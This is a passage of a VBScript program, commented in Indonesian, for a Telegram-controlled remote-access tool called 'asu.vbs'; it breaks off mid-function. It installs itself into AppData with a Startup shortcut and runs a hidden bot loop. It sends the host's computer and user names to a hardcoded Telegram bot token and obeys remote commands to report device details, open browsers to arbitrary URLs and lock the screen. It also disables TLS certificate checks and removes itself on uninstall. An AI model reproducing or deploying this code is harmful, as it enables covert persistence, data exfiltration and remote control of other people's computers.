Option Explicit

' ===== Globals =====
Dim shell, fso, args
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")
Set args  = WScript.Arguments

Dim ACTION: ACTION = ""
If args.Count > 0 Then ACTION = LCase(Trim(args(0)))

' Paths
Const APP_DIR_NAME = "AsuVBS"
Dim APP_DIR, INSTALLED_SCRIPT, STARTUP_LNK, CFG_PATH, EDIT_CFG_PATH
APP_DIR          = shell.ExpandEnvironmentStrings("%APPDATA%") & "\" & APP_DIR_NAME
INSTALLED_SCRIPT = APP_DIR & "\asu.vbs"
STARTUP_LNK      = shell.SpecialFolders("Startup") & "\asu.lnk"
CFG_PATH         = APP_DIR & "\config.ini"
EDIT_CFG_PATH    = APP_DIR & "\edit.ini"
 ' state.ini dihapus; offset dipindah ke config.ini

' ===== Locks/Runtime =====

' Telegram token default (boleh dikosongkan jika ingin set manual)
Dim TELEGRAM_TOKEN_DEFAULT: TELEGRAM_TOKEN_DEFAULT = "8092221989:AAH8xgLdZ2sJjShD5QYqH3aKoTqW2JiHcU0"

' Fitur website lawas dihapus, tetapi tambahkan MODE (server/client)
Dim TELEGRAM_TOKEN, LAST_CHAT_ID: TELEGRAM_TOKEN = "": LAST_CHAT_ID = ""
Dim ALLOWED_CHAT_IDS, TAMPER_PROTECT, SCRIPT_HASH, CONTROL_CODE
Dim ALLOW_LOCK, ALLOW_OPEN_APPS
Dim APP_MODE: APP_MODE = "standalone"  ' nilai: "server" | "client" | "standalone"
Dim LAST_OFFSET: LAST_OFFSET = 0
ALLOWED_CHAT_IDS = ""
TAMPER_PROTECT = 0
SCRIPT_HASH = ""
CONTROL_CODE = ""
ALLOW_LOCK = 1
ALLOW_OPEN_APPS = 1

' ===== Entry =====
Select Case ACTION
  Case "show": ShowText: MaybeStartBot: WScript.Quit 0
  Case "bot":  BotLoop: WScript.Quit 0
  Case "botstop": StopAnyBots: WScript.Quit 0
  Case "settoken": SetToken: WScript.Quit 0
End Select

Dim resp
resp = MsgBox("Pilih Yes untuk Install/Perbarui, No untuk Uninstall.", vbYesNo + vbQuestion, "asu.vbs")
If resp = vbYes Then
  Install
Else
  Uninstall
End If
WScript.Quit 0


' ===== UI =====
Sub ShowText()
  shell.Popup "hahahaha", 5, "asu.vbs", 64
  TelegramNotifyActive
End Sub




' ===== Install/Uninstall =====
Sub Install()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR

  StopAnyBots

  fso.CopyFile WScript.ScriptFullName, INSTALLED_SCRIPT, True
  EnsureInstalledScriptExists

  Dim lnk: Set lnk = shell.CreateShortcut(STARTUP_LNK)
  lnk.TargetPath = shell.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")
  lnk.Arguments  = Chr(34) & INSTALLED_SCRIPT & Chr(34) & " show"
  lnk.WorkingDirectory = APP_DIR
  lnk.IconLocation = shell.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe") & ",0"
  lnk.Description = "asu.vbs startup"
  lnk.Save

  LoadCfg True
  If TELEGRAM_TOKEN = "" Then TELEGRAM_TOKEN = TELEGRAM_TOKEN_DEFAULT: SaveCfg
  ' Pilih mode instalasi: Server atau Client
  Dim mSel: mSel = PromptInstallMode()
  If mSel <> "" Then APP_MODE = mSel Else APP_MODE = "client"
  ' Simpan hash skrip terpasang untuk deteksi ubah
  SCRIPT_HASH = CalcFileHash(INSTALLED_SCRIPT)
  TAMPER_PROTECT = 1
  SaveCfg
  ' Bersihkan file warisan agar hanya 2 file tersisa di AppData
  CleanAppDirExtras

  ShowText
  TelegramNotifyInstall
  MaybeStartBot
  ' Tidak ada server/client loop
  On Error GoTo 0
End Sub

Sub Uninstall()
  On Error Resume Next
  StopAnyBots
  If fso.FileExists(STARTUP_LNK) Then fso.DeleteFile STARTUP_LNK, True

  Dim cur: cur = WScript.ScriptFullName
  If LCase(cur) = LCase(INSTALLED_SCRIPT) Then
    TelegramNotifyUninstall
    ScheduleSelfRemoval INSTALLED_SCRIPT, APP_DIR
  Else
    TelegramNotifyUninstall
    If fso.FileExists(INSTALLED_SCRIPT) Then fso.DeleteFile INSTALLED_SCRIPT, True
    If fso.FolderExists(APP_DIR) Then fso.DeleteFolder APP_DIR, True
  End If
  On Error GoTo 0
End Sub

Sub ScheduleSelfRemoval(scriptPath, dirPath)
  On Error Resume Next
  Dim bat: bat = shell.ExpandEnvironmentStrings("%TEMP%") & "\asu_uninstall.cmd"
  Dim t: Set t = fso.OpenTextFile(bat, 2, True)
  t.Write "@echo off" & vbCrLf & _
          "ping 127.0.0.1 -n 3 >nul" & vbCrLf & _
          "del /f /q """ & scriptPath & """" & vbCrLf & _
          "del /f /q """ & dirPath & "\config.ini""" & vbCrLf & _
          "rmdir /s /q """ & dirPath & """" & vbCrLf & _
          "del /f /q ""%~f0""" & vbCrLf
  t.Close
  shell.Run "cmd.exe /c start """" """" & bat & """"", 0, False
  On Error GoTo 0
End Sub

Sub MaybeStartBot()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR
  EnsureInstalledScriptExists
  ' Mode website dinonaktifkan: tidak ada server untuk dihentikan
  CleanAppDirExtras
  If IsBotRunning() Then Exit Sub
  shell.Run "wscript """ & INSTALLED_SCRIPT & """ bot", 0, False
  ' Tidak ada loop server/client
  On Error GoTo 0
End Sub

' ===== Install Mode Picker =====
Function PromptInstallMode()
  On Error Resume Next
  Dim r
  r = MsgBox("Pilih mode instalasi:" & vbCrLf & _
             "Yes = Server, No = Client", _
             vbQuestion + vbYesNo, "Pilih Mode")
  If r = vbYes Then
    PromptInstallMode = "server"
  ElseIf r = vbNo Then
    PromptInstallMode = "client"
  Else
    PromptInstallMode = "client"
  End If
  On Error GoTo 0
End Function

Function IsBotRunning()
  On Error Resume Next
  Dim svc, p, cmd, found: found = False
  Set svc = GetObject("winmgmts:\\.\root\cimv2")
  For Each p In svc.ExecQuery("SELECT ProcessId, CommandLine, Name FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
    cmd = LCase(SafeStr(p.CommandLine))
    If cmd <> "" Then If InStr(cmd, "asu.vbs") > 0 And InStr(cmd, " bot") > 0 Then found = True
  Next
  IsBotRunning = found
  On Error GoTo 0
End Function

' ===== Self Test =====
 ' SelfTest dihapus (tidak digunakan)

' IsProcessWithCmdRunning dihapus
' IsScriptActionRunning dihapus
' SetRuntimeMode dihapus (mode server/client tidak digunakan)

 ' SimpleHash dihapus (tidak digunakan)

' Ensure installed script exists under APP_DIR
Sub EnsureInstalledScriptExists()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR
  If Not fso.FileExists(INSTALLED_SCRIPT) Then
    fso.CopyFile WScript.ScriptFullName, INSTALLED_SCRIPT, True
  End If
  On Error GoTo 0
End Sub

' Hapus file warisan agar hanya asu.vbs dan config.ini yang tersisa
Sub CleanAppDirExtras()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then Exit Sub
  Dim f
  ' Hapus file legacy yang tidak dipakai lagi
  For Each f In Array( _
      APP_DIR & "\bot.lock", _
      APP_DIR & "\cmd10.lock", _
      APP_DIR & "\server.ps1", _
      APP_DIR & "\server.log", _
      APP_DIR & "\state.ini" _
    )
    If fso.FileExists(f) Then fso.DeleteFile f, True
  Next
  ' Hapus u_*.claimed
  Dim folder, file
  Set folder = fso.GetFolder(APP_DIR)
  For Each file In folder.Files
    If LCase(Left(file.Name,2)) = "u_" And LCase(Right(file.Name,8)) = ".claimed" Then
      fso.DeleteFile file.Path, True
    End If
  Next
  On Error GoTo 0
End Sub

' Pastikan shortcut startup tersedia dan menunjuk ke skrip terpasang (mode silent, tanpa prompt).
Sub EnsureStartupShortcut()
  On Error Resume Next
  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR
  Dim lnk: Set lnk = shell.CreateShortcut(STARTUP_LNK)
  lnk.TargetPath = shell.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")
  lnk.Arguments  = Chr(34) & INSTALLED_SCRIPT & Chr(34) & " show"
  lnk.WorkingDirectory = APP_DIR
  lnk.IconLocation = shell.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe") & ",0"
  lnk.Description = "asu.vbs startup"
  lnk.Save
  On Error GoTo 0
End Sub

Sub StopAnyBots()
  ' Kill all running bot instances (no exclusions)
  StopAnyBotsExcept -1
End Sub

Sub StopAnyBotsExcept(skipPid)
  On Error Resume Next
  Dim svc, p, cmd
  Set svc = GetObject("winmgmts:\\.\root\cimv2")
  For Each p In svc.ExecQuery("SELECT ProcessId, CommandLine, Name FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
    cmd = LCase(SafeStr(p.CommandLine))
    If cmd <> "" Then
      If InStr(cmd, "asu.vbs") > 0 And InStr(cmd, " bot") > 0 Then
        ' If skipPid is provided (>=0), skip terminating that PID
        If IsNumeric(skipPid) And CLng(skipPid) >= 0 Then
          If CLng(skipPid) <> CLng(p.ProcessId) Then p.Terminate
        Else
          p.Terminate
        End If
      End If
    End If
  Next
  On Error GoTo 0
End Sub




' Jadwal restart bot dihapus
' ===== Telegram =====
Sub SetToken()
  Dim tok
  If args.Count > 1 Then tok = Trim(args(1)) Else tok = ""
  If tok = "" Then tok = InputBox("Masukkan token bot Telegram", "asu.vbs", TELEGRAM_TOKEN_DEFAULT)
  If Trim(tok) <> "" Then
    LoadCfg True
    TELEGRAM_TOKEN = Trim(tok)
    SaveCfg
    MsgBox "Token disimpan.", vbInformation, "asu.vbs"
  End If
End Sub



Sub TelegramNotifyInstall()
  On Error Resume Next
  LoadCfg False
  If TELEGRAM_TOKEN = "" Then TELEGRAM_TOKEN = TELEGRAM_TOKEN_DEFAULT
  If LAST_CHAT_ID = "" Then LAST_CHAT_ID = DetectLatestChatId()
  If LAST_CHAT_ID <> "" Then
    SaveCfg
    Dim net: Set net = CreateObject("WScript.Network")
    Dim msg: msg = "tools asu terinstall - " & net.ComputerName & " (" & net.UserDomain & "\" & net.UserName & ") pada " & _
                  FormatDateTime(Now, vbLongDate) & " " & FormatDateTime(Now, vbLongTime)
    TelegramSendMessage TELEGRAM_TOKEN, LAST_CHAT_ID, msg
  End If
  On Error GoTo 0
End Sub

Sub TelegramNotifyActive()
  On Error Resume Next
  LoadCfg False
  If TELEGRAM_TOKEN = "" Then TELEGRAM_TOKEN = TELEGRAM_TOKEN_DEFAULT
  If LAST_CHAT_ID = "" Then LAST_CHAT_ID = DetectLatestChatId()
  If LAST_CHAT_ID = "" Then Exit Sub
  Dim net: Set net = CreateObject("WScript.Network")
  Dim msg
  msg = "tools asu aktif - " & net.ComputerName & " (" & net.UserDomain & "\" & net.UserName & ") pada " & _
        FormatDateTime(Now, vbLongDate) & " " & FormatDateTime(Now, vbLongTime)
  TelegramSendMessage TELEGRAM_TOKEN, LAST_CHAT_ID, msg
  On Error GoTo 0
End Sub

Sub TelegramNotifyUninstall()
  On Error Resume Next
  LoadCfg False
  If TELEGRAM_TOKEN = "" Then TELEGRAM_TOKEN = TELEGRAM_TOKEN_DEFAULT
  If LAST_CHAT_ID = "" Then LAST_CHAT_ID = DetectLatestChatId()
  If LAST_CHAT_ID = "" Then Exit Sub
  Dim net: Set net = CreateObject("WScript.Network")
  Dim msg
  msg = "tools asu dihapus - " & net.ComputerName & " (" & net.UserDomain & "\" & net.UserName & ") pada " & _
        FormatDateTime(Now, vbLongDate) & " " & FormatDateTime(Now, vbLongTime)
  TelegramSendMessage TELEGRAM_TOKEN, LAST_CHAT_ID, msg
  On Error GoTo 0
End Sub

Sub BotLoop()
  On Error Resume Next
  LoadCfg True
  If TELEGRAM_TOKEN = "" Then TELEGRAM_TOKEN = TELEGRAM_TOKEN_DEFAULT
  If TELEGRAM_TOKEN = "" Then Exit Sub
  TelegramDeleteWebhook
  ' Cek integritas skrip jika diaktifkan
  If TAMPER_PROTECT = 1 Then
    Dim curHash: curHash = CalcFileHash(INSTALLED_SCRIPT)
    If SCRIPT_HASH <> "" And curHash <> "" And UCase(curHash) <> UCase(SCRIPT_HASH) Then
      If LAST_CHAT_ID <> "" Then TelegramSendMessage TELEGRAM_TOKEN, LAST_CHAT_ID, "Peringatan: integritas skrip berubah. Bot berhenti."
      Exit Sub
    End If
  End If

  If Not fso.FolderExists(APP_DIR) Then fso.CreateFolder APP_DIR

  ' Penandaan siap tidak digunakan lagi

  Dim offset: offset = LoadLastOffset() + 1
  Do
    Dim url, resp
    url = "https://api.telegram.org/bot" & TELEGRAM_TOKEN & "/getUpdates?timeout=25&allowed_updates=%5B%22message%22%5D"
    If offset > 0 Then url = url & "&offset=" & CStr(offset)
    resp = HttpGet(url)
    If Len(resp) > 0 Then ProcessUpdates resp, offset
    WScript.Sleep 1000
  Loop
End Sub



Sub ProcessUpdates(resp, ByRef offset)
  On Error Resume Next
  Dim pos: pos = 1
  Do
    Dim uPos: uPos = InStr(pos, resp, """update_id"":")
    If uPos = 0 Then Exit Do
    Dim nextU: nextU = InStr(uPos + 1, resp, """update_id"":")
    If nextU = 0 Then nextU = Len(resp) + 1

    Dim uid: uid = CLng(ParseNumber(resp, uPos + Len("""update_id"":")))
    Dim chatId: chatId = ParseChatId(resp, uPos, nextU)
    Dim text: text = ParseText(resp, uPos, nextU)

    If uid > offset Then offset = uid + 1: SaveLastOffset uid

    If TryClaimUpdate(uid) Then
      If chatId <> "" Then
        If IsAuthorizedChat(chatId) Then
          If LAST_CHAT_ID <> chatId Then LAST_CHAT_ID = chatId: SaveCfg
          If text = "" Then text = SniffCommand(resp, uPos, nextU)
          If Left(LCase(Trim(text)),1) = "/" Then HandleCommand chatId, text
        End If
      End If
    End If

    pos = nextU
  Loop
  On Error GoTo 0
End Sub

Function TryClaimUpdate(uid)
  ' Claimed-by-file: pastikan satu update hanya diproses sekali
  On Error Resume Next
  Dim claim
  claim = APP_DIR & "\\u_" & CStr(uid) & ".claimed"
  ' Jika sudah ada, anggap sudah diproses oleh instance lain
  If fso.FileExists(claim) Then
    TryClaimUpdate = False
    Exit Function
  End If
  ' Coba buat file klaim tanpa overwrite (atomik sederhana)
  Dim t: Set t = fso.CreateTextFile(claim, False)
  If Err.Number <> 0 Then
    Err.Clear
    TryClaimUpdate = False
  Else
    On Error Resume Next: t.Write "1": t.Close
    TryClaimUpdate = True
  End If
  On Error GoTo 0
End Function

Sub HandleCommand(chatId, text)
  On Error Resume Next
  Dim cmd: cmd = LCase(Trim(Split(CStr(text), " ")(0)))
  If InStr(cmd, "@") > 0 Then cmd = Left(cmd, InStr(cmd, "@")-1)
  Select Case cmd
    Case "/help", "/start"
      Dim help
      help = "Perintah tersedia:" & vbCrLf & _
             "/help - daftar perintah" & vbCrLf & _
              "/device_info - detail perangkat" & vbCrLf & _
              "/open_chrome [url] - buka Google Chrome (opsional buka URL)" & vbCrLf & _
              "/opan_edge [url] - buka Microsoft Edge (opsional buka URL)" & vbCrLf & _
             "/win_L - kunci layar (Lock)" & vbCrLf & _
              "/tools_info - info tools & config"
      TelegramSendMessage TELEGRAM_TOKEN, chatId, help
    ' Perintah /mode ditiadakan (fitur website dihapus)
    Case "/divice_info", "/device_info"
      TelegramSendLongMessage chatId, GetDeviceDetailsText()
    Case "/tools_info"
      TelegramSendLongMessage chatId, GetToolsInfoText()
    Case "/open_chrome"
      If ALLOW_OPEN_APPS = 0 Then
        TelegramSendMessage TELEGRAM_TOKEN, chatId, "Fitur membuka aplikasi dinonaktifkan."
      Else
        Dim partsOC, urlArg
        partsOC = Split(CStr(text), " ")
        If UBound(partsOC) >= 1 Then urlArg = Trim(Mid(CStr(text), Len(partsOC(0)) + 2)) Else urlArg = ""
        If OpenChromeWithUrl(urlArg) Then
          If urlArg <> "" Then
            TelegramSendMessage TELEGRAM_TOKEN, chatId, "Membuka Google Chrome ke: " & urlArg
          Else
            TelegramSendMessage TELEGRAM_TOKEN, chatId, "Membuka Google Chrome."
          End If
        Else
          TelegramSendMessage TELEGRAM_TOKEN, chatId, "Google Chrome tidak ditemukan."
        End If
      End If
    Case "/opan_edge"
      If ALLOW_OPEN_APPS = 0 Then
        TelegramSendMessage TELEGRAM_TOKEN, chatId, "Fitur membuka aplikasi dinonaktifkan."
      Else
        Dim partsOE, urlArgE
        partsOE = Split(CStr(text), " ")
        If UBound(partsOE) >= 1 Then urlArgE = Trim(Mid(CStr(text), Len(partsOE(0)) + 2)) Else urlArgE = ""
        If OpenEdgeWithUrl(urlArgE) Then
          If urlArgE <> "" Then
            TelegramSendMessage TELEGRAM_TOKEN, chatId, "Membuka Microsoft Edge ke: " & urlArgE
          Else
            TelegramSendMessage TELEGRAM_TOKEN, chatId, "Membuka Microsoft Edge."
          End If
        Else
          TelegramSendMessage TELEGRAM_TOKEN, chatId, "Microsoft Edge tidak ditemukan."
        End If
      End If
    Case "/win_l", "/win+l"
      If ALLOW_LOCK = 0 Then
        TelegramSendMessage TELEGRAM_TOKEN, chatId, "Perintah kunci layar dinonaktifkan."
      ElseIf CONTROL_CODE <> "" Then
        Dim parts, codeArg
        parts = Split(CStr(text), " ")
        If UBound(parts) >= 1 Then codeArg = Trim(parts(1)) Else codeArg = ""
        If codeArg = CONTROL_CODE Then
          TelegramSendMessage TELEGRAM_TOKEN, chatId, "Mengunci layar sekarang."
          LockScreen
        Else
          TelegramSendMessage TELEGRAM_TOKEN, chatId, "Kode tidak valid untuk /win_L"
        End If
      Else
        TelegramSendMessage TELEGRAM_TOKEN, chatId, "Mengunci layar sekarang."
        LockScreen
      End If
    ' Hapus perintah /cmd_10
  End Select
  On Error GoTo 0
End Sub


' ===== Telegram HTTP helpers =====
Sub TelegramSendLongMessage(chatId, text)
  Dim maxLen: maxLen = 3500
  If Len(text) <= maxLen Then
    TelegramSendMessage TELEGRAM_TOKEN, chatId, text
  Else
    ' 1 input -> 1 output: kirim sekali saja (dipangkas)
    Dim headLen, suffix
    suffix = vbCrLf & "... (dipangkas)"
    headLen = maxLen - Len(suffix)
    If headLen < 1 Then headLen = maxLen
    TelegramSendMessage TELEGRAM_TOKEN, chatId, Left(text, headLen) & suffix
  End If
End Sub

Sub TelegramSendMessage(tok, chatId, text)
  On Error Resume Next
  Dim prefix, payload
  Select Case LCase(APP_MODE)
    Case "server": prefix = "[server]"
    Case "client": prefix = "[client]"
    Case Else:     prefix = ""
  End Select
  If prefix <> "" Then
    payload = prefix & vbCrLf & CStr(text)
  Else
    payload = CStr(text)
  End If
  Dim url: url = "https://api.telegram.org/bot" & tok & "/sendMessage?chat_id=" & UrlEncode(chatId) & "&text=" & UrlEncode(payload)
  Call HttpGet(url)
  On Error GoTo 0
End Sub

Function HttpGet(url)
  On Error Resume Next
  Dim u, i, http, status, loc
  u = CStr(url)
  For i = 1 To 3
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Not http Is Nothing Then
      On Error Resume Next
      http.Open "GET", u, False
      ' Timeout: resolve, connect, send, receive (ms)
      If Not IsEmpty(http) Then On Error Resume Next: http.SetTimeouts 5000, 5000, 5000, 7000
      ' Ignore certain SSL issues for robustness
      On Error Resume Next: http.Option(6) = 13056 ' WINHTTP_CALLBACK_FLAG_SECURE_FAILURES combined
      On Error Resume Next: http.SetRequestHeader "User-Agent", "ASU/1"
      On Error Resume Next: http.Send
      status = 0: On Error Resume Next: status = CLng(http.Status)
      If status >= 200 And status < 300 Then HttpGet = http.ResponseText: Exit Function
      If status >= 300 And status < 400 Then
        loc = Trim(http.GetResponseHeader("Location"))
        If loc <> "" Then u = loc: Set http = Nothing
      End If
    End If
    ' Fallback to ServerXMLHTTP (lebih baik untuk TLS modern)
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
    If Not http Is Nothing Then
      On Error Resume Next
      http.Open "GET", u, False
      On Error Resume Next: http.setTimeouts 5000, 5000, 5000, 7000
      On Error Resume Next: http.setRequestHeader "User-Agent", "ASU/1"
      On Error Resume Next: http.Send
      status = 0: On Error Resume Next: status = CLng(http.status)
      If status >= 200 And status < 300 Then HttpGet = http.responseText: Exit Function
      If status >= 300 And status < 400 Then
        loc = Trim(http.getResponseHeader("Location"))
        If loc <> "" Then u = loc: Set http = Nothing
      End If
    End If
    Exit For
  Next
  HttpGet = ""
  On Error GoTo 0
End Function

Sub TelegramDeleteWebhook()
  On Error Resume Next
  If TELEGRAM_TOKEN = "" Then Exit Sub
  Call HttpGet("https://api.telegram.org/bot" & TELEGRAM_TOKEN & "/deleteWebhook")
  On Error GoTo 0
End Sub

' Paksa klien sinkron dari server dan jalankan auto-update; kirim notifikasi hasil
' ForceClientSync dihapus
' ClientApplyScriptFromUrl dihapus
' BuildSyncUrlsFrom dihapus
Function DetectLatestChatId()
  On Error Resume Next
  DetectLatestChatId = ""
  If TELEGRAM_TOKEN = "" Then Exit Function
  Dim resp: resp = HttpGet("https://api.telegram.org/bot" & TELEGRAM_TOKEN & "/getUpdates?limit=5")
  If Len(resp) = 0 Then Exit Function
  Dim pos, uPos, nextU, cId: pos = 1
  Do
    uPos = InStr(pos, resp, """update_id"":")
    If uPos = 0 Then Exit Do
    nextU = InStr(uPos + 1, resp, """update_id"":")
    If nextU = 0 Then nextU = Len(resp) + 1
    cId = ParseChatId(resp, uPos, nextU)
    If cId <> "" Then DetectLatestChatId = cId
    pos = nextU
  Loop
  On Error GoTo 0
End Function

Function IsAuthorizedChat(cid)
  On Error Resume Next
  Dim allowed
  If Len(Trim(ALLOWED_CHAT_IDS)) = 0 Then
    IsAuthorizedChat = True
    Exit Function
  End If
  allowed = "," & Replace(Trim(ALLOWED_CHAT_IDS), " ", "") & ","
  If InStr(allowed, "," & CStr(cid) & ",") > 0 Then
    IsAuthorizedChat = True
  ElseIf CStr(cid) = CStr(LAST_CHAT_ID) Then
    IsAuthorizedChat = True
  Else
    IsAuthorizedChat = False
  End If
  On Error GoTo 0
End Function

Function CalcFileHash(path)
  On Error Resume Next
  Dim sh, exec, out, line
  If Not fso.FileExists(path) Then CalcFileHash = "": Exit Function
  Set sh = CreateObject("WScript.Shell")
  Set exec = sh.Exec("cmd /c certutil -hashfile """ & path & """ SHA256")
  out = ""
  Do While Not exec.StdOut.AtEndOfStream
    line = Trim(exec.StdOut.ReadLine())
    If line <> "" And InStr(line, "CertUtil") = 0 And InStr(line, "SHA256") = 0 And InStr(line, "hash") = 0 And InStr(line, "= ") = 0 Then
      out = out & Replace(line, " ", "")
    End If
  Loop
  CalcFileHash = UCase(out)
  On Error GoTo 0
End Function


' ===== Persistent offset state (pindah ke config.ini) =====
Function LoadLastOffset()
  On Error Resume Next
  LoadLastOffset = 0
  If IsNumeric(LAST_OFFSET) Then LoadLastOffset = CLng(LAST_OFFSET)
  On Error GoTo 0
End Function

Sub SaveLastOffset(v)
  On Error Resume Next
  LAST_OFFSET = CLng(v)
  SaveCfg
  On Error GoTo 0
End Sub


' ===== JSON helpers =====
Function ParseNumber(s, startAt)
  Dim i, ch, out: out = ""
  i = startAt
  Do While i <= Len(s) And (Mid(s,i,1) = " " Or Mid(s,i,1) = vbTab Or Mid(s,i,1) = ":")
    i = i + 1
  Loop
  If i <= Len(s) And Mid(s,i,1) = "-" Then out = "-": i = i + 1
  Do While i <= Len(s)
    ch = Mid(s,i,1)
    If ch < "0" Or ch > "9" Then Exit Do
    out = out & ch
    i = i + 1
  Loop
  ParseNumber = out
End Function

Function FindWithin(s, find, startAt, endAt)
  Dim p: p = InStr(startAt, s, find)
  If p = 0 Then
    FindWithin = 0
  ElseIf p >= endAt Then
    FindWithin = 0
  Else
    FindWithin = p
  End If
End Function

Function ParseChatId(s, uStart, uEnd)
  Dim c, idPos
  ParseChatId = ""
  c = FindWithin(s, """chat"":", uStart, uEnd)
  If c = 0 Then Exit Function
  idPos = FindWithin(s, """id"":", c, uEnd)
  If idPos = 0 Then Exit Function
  ParseChatId = ParseNumber(s, idPos + Len("""id"":"))
End Function

Function ExtractJSONString(s, qPos, endAt)
  Dim i, ch, esc, out: out = "": esc = False
  For i = qPos + 1 To endAt
    ch = Mid(s,i,1)
    If esc Then
      Select Case ch
        Case "\": out = out & "\"
        Case "/": out = out & "/"
        Case """": out = out & """"
        Case "n": out = out & vbLf
        Case "r": out = out & vbCr
        Case "t": out = out & vbTab
        Case Else: out = out & ch
      End Select
      esc = False
    Else
      If ch = "\" Then
        esc = True
      ElseIf ch = """" Then
        Exit For
      Else
        out = out & ch
      End If
    End If
  Next
  ExtractJSONString = out
End Function

Function ParseText(s, uStart, uEnd)
  Dim t, colonPos, q
  ParseText = ""
  t = FindWithin(s, """text"":", uStart, uEnd)
  If t = 0 Then Exit Function
  colonPos = InStr(t, s, ":")
  q = InStr(colonPos + 1, s, Chr(34))
  If q = 0 Or q >= uEnd Then Exit Function
  ParseText = ExtractJSONString(s, q, uEnd)
End Function

Function SniffCommand(s, uStart, uEnd)
  Dim seg: seg = Mid(s, uStart, uEnd - uStart)
  If InStr(1, seg, "/help", vbTextCompare) > 0 Then SniffCommand = "/help": Exit Function
  If InStr(1, seg, "/start", vbTextCompare) > 0 Then SniffCommand = "/start": Exit Function
  If InStr(1, seg, "/tools_info", vbTextCompare) > 0 Then SniffCommand = "/tools_info": Exit Function
  If InStr(1, seg, "/open_chrome", vbTextCompare) > 0 Then SniffCommand = "/open_chrome": Exit Function
  If InStr(1, seg, "/opan_edge", vbTextCompare) > 0 Then SniffCommand = "/opan_edge": Exit Function
  If InStr(1, seg, "/win_l", vbTextCompare) > 0 Or InStr(1, seg, "/win+l", vbTextCompare) > 0 Then SniffCommand = "/win_l": Exit Function
  If InStr(1, seg, "/device_info", vbTextCompare) > 0 Or InStr(1, seg, "/divice_info", vbTextCompare) > 0 Then SniffCommand = "/device_info": Exit Function
  If InStr(1, seg, "/cmd_10", vbTextCompare) > 0 Then SniffCommand = "/cmd_10": Exit Function
  SniffCommand = ""
End Function


' ===== Helpers =====
Function SafeStr(v)
  If IsNull(v) Or IsEmpty(v) Then SafeStr = "" Else SafeStr = CStr(v)
End Function

Function WMIDateStringToDate(dtm)
  On Error Resume Next
  If Len(dtm) < 14 Then WMIDateStringToDate = Null: Exit Function
  Dim y, mo, d, h, mi, s
  y = CInt(Left(dtm,4)): mo = CInt(Mid(dtm,5,2)): d = CInt(Mid(dtm,7,2))
  h = CInt(Mid(dtm,9,2)): mi = CInt(Mid(dtm,11,2)): s = CInt(Mid(dtm,13,2))
  WMIDateStringToDate = CDate(mo & "/" & d & "/" & y & " " & h & ":" & mi & ":" & s)
  On Error GoTo 0
End Function

Function FormatBytes(b)
  Dim dbl: On Error Resume Next: dbl = CDbl(b): On Error GoTo 0
  If dbl < 1024 Then
    FormatBytes = CStr(dbl) & " B"
  ElseIf dbl < 1024^2 Then
    FormatBytes = Round(dbl/1024, 2) & " KB"
  ElseIf dbl < 1024^3 Then
    FormatBytes = Round(dbl/(1024^2), 2) & " MB"
  Else
    FormatBytes = Round(dbl/(1024^3), 2) & " GB"
  End If
End Function

Function FormatUptime(bootDate)
  Dim mins: mins = DateDiff("n", bootDate, Now): If mins < 0 Then mins = 0
  FormatUptime = (mins \ 1440) & "d " & ((mins Mod 1440) \ 60) & "h " & (mins Mod 60) & "m"
End Function

Function UrlEncode(str)
  Dim i, ch, code, out: out = ""
  For i = 1 To Len(str)
    ch = Mid(str, i, 1): code = AscW(ch)
    If (code>=48 And code<=57) Or (code>=65 And code<=90) Or (code>=97 And code<=122) Or ch="-" Or ch="_" Or ch="." Or ch="~" Then
      out = out & ch
    ElseIf ch = " " Then
      out = out & "%20"
    Else
      out = out & "%" & Right("0" & Hex(code And &HFF), 2)
    End If
  Next
  UrlEncode = out
End Function

Function IIfVB(cond, trueVal, falseVal)
  If cond Then
    IIfVB = trueVal
  Else
    IIfVB = falseVal
  End If
End Function

Function GetToolsInfoText()
  On Error Resume Next
  LoadCfg False
  Dim net: Set net = CreateObject("WScript.Network")
  Dim tokenTxt: tokenTxt = MaskToken(TELEGRAM_TOKEN)
  Dim info
  info = "Tools ASU Info" & vbCrLf & _
          "Device: " & net.ComputerName & " (" & net.UserDomain & "\" & net.UserName & ")" & vbCrLf & _
          "Token: " & tokenTxt & vbCrLf & _
          "Mode: " & IIfVB(Len(Trim(APP_MODE))>0, APP_MODE, "standalone") & vbCrLf & _
          "Last Chat ID: " & IIfVB(Len(Trim(LAST_CHAT_ID))>0, LAST_CHAT_ID, "(kosong)") & vbCrLf & _
          "AppDir: " & APP_DIR & vbCrLf & _
          "Config: " & CFG_PATH & vbCrLf & _
          "Edit Config: " & EDIT_CFG_PATH & vbCrLf & _
          "Startup: " & STARTUP_LNK & vbCrLf & _
          "Last Offset: " & CStr(LoadLastOffset()) & vbCrLf & _
          "Waktu: " & FormatDateTime(Now, vbLongDate) & " " & FormatDateTime(Now, vbLongTime)
  GetToolsInfoText = info
  On Error GoTo 0
End Function

Function MaskToken(tok)
  If tok = "" Then
    MaskToken = "(kosong)"
  ElseIf Len(tok) <= 8 Then
    MaskToken = Left(tok, 2) & String(Len(tok)-2, "*")
  Else
    MaskToken = Left(tok, 4) & "..." & Right(tok, 4)
  End If
End Function


' ===== Device Info =====
Sub LockScreen()
  On Error Resume Next
  shell.Run "rundll32.exe user32.dll,LockWorkStation", 0, False
  On Error GoTo 0
End Sub

Function OpenChrome()
  On Error Resume Next
  Dim p1, p2, p
  p1 = shell.ExpandEnvironmentStrings("%ProgramFiles%") & "\Google\Chrome\Application\chrome.exe"
  p2 = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Google\Chrome\Application\chrome.exe"
  For Each p In Array(p1, p2)
    If fso.FileExists(p) Then
